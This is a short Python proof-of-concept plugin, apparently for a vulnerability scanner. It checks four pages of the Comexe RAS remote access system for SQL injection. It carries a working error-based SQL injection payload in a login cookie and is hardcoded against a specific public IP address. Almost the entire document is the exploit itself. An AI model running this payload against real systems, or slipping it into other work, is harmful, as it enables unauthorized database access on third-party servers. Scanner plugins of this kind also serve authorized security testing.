#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 科迈RAS系统四处SQL注入

def assign(service, arg):
    if service == 'comexe_ras':
        return True, arg

def audit(arg):
    payloads = [
    "Client/CmxHome.php cookie",
    "Client/CmxAbout.php",
    "Client/CmxChangePass.php",
    "Client/CmxDownload.php"
    ]
    for payload in payloads:
        target = arg + payload
        code, head, body, errcode, final_url = curl.curl2(target,cookie="RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#")
        if code == 200 and 'qxjbq1qpzqq1' in body:
            security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('comexe_ras', 'http://202.103.252.103/')[1])